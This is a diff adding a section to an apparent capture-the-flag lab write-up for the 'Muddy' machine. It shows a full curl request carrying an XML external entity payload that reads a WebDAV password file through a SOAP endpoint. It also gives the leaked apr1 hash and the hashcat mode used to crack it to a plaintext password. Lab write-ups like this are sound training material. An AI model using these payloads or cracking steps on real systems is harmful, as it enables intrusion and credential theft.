@@ -195,4 +195,53 @@ xmlns:urn=\&quot;urn:checkout\&quot;&gt;&lt;soapenv:Header/&gt;
 &lt;/SOAP-ENV:Envelope&gt;
     </pre>
 
-    <p>Now that we have a working LFI exploit we will use it to gain more information to gain shell access to the host.</p>
+    <p>Now that we have a working LFI exploit we will use it to gain more information to gain shell access to the host.  Thinking back to the muddy.ugc/webdav directory, there are likely credentials for basic auth on the web server.  We can find these credentials in /var/www/html/webdav/passwd.dav</p>
+
+    LFI for passwd.dave file</li>
+
+    <pre>
+ &#x250c;&#x2500;&#x2500;(kali&#x327f;kali)-[~/Documents/ProvingGrounds/Muddy/exfiltrated]
+&#x2514;&#x2500;$ curl -s -X $&#039;POST&#039; \                                                                                         1 &#x2a2f;
+-H $&#039;Content-Type: text/xml;charset=UTF-8&#039; \
+-H $&#039;SOAPAction: \&quot;http://muddy.ugc:8888/muddy/soap11/checkout\&quot;&#039; \
+--data-binary $&#039;&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE uid
+[&lt;!ENTITY passwd SYSTEM &quot;file:///var/www/html/webdav/passwd.dav&quot;&gt;
+]&gt;
+&lt;soapenv:Envelope xmlns:xsi=\&quot;http://www.w3.org/2001/XMLSchema-instance\&quot;
+xmlns:xsd=\&quot;http://www.w3.org/2001/XMLSchema\&quot;
+xmlns:soapenv=\&quot;http://schemas.xmlsoap.org/soap/envelope/\&quot;
+xmlns:urn=\&quot;urn:checkout\&quot;&gt;&lt;soapenv:Header/&gt;
+&lt;soapenv:Body&gt;
+&lt;urn:checkout soapenv:encodingStyle=\&quot;http://schemas.xmlsoap.org/soap/encoding/\&quot;&gt;
+&lt;uid xsi:type=\&quot;xsd:string\&quot;&gt;&amp;passwd;&lt;/uid&gt;    
+&lt;/urn:checkout&gt;
+&lt;/soapenv:Body&gt;
+&lt;/soapenv:Envelope&gt;&#039; \
+&#039;http://muddy.ugc:8888/muddy/soap11&#039; | xmllint --format -       
+    </pre>
+
+    <li>Returns:</li>
+
+    <pre>
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;SOAP-ENV:Envelope xmlns:SOAP-ENC=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot; xmlns:SOAP-ENV=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:ns=&quot;urn:muddy&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot;&gt;
+  &lt;SOAP-ENV:Body SOAP-ENV:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;
+    &lt;ns:checkoutResponse&gt;
+      &lt;result&gt;Serial number: administrant:$apr1$GUG1OnCu$uiSLaAQojCm14lPMwISDi0&lt;/result&gt;
+    &lt;/ns:checkoutResponse&gt;
+  &lt;/SOAP-ENV:Body&gt;
+&lt;/SOAP-ENV:Envelope&gt;
+    </pre>
+
+    <p>I choose to crack this hash ($apr1$GUG1OnCu$uiSLaAQojCm14lPMwISDi0) using hashcat.  In order to identify the hash mode required, I go to https://hashcat.net/wiki/doku.php?id=example_hashes and search the page for the first characters of the hash, "apr1".  This brings be to the hashcat mode 1600</p>
+
+    <img src="Muddy/hashcat.png">
+
+
+    <li>I crack the hash with hashcat and it comes back with the password sleepless</li>
+
+
+
+</body>
+</html>
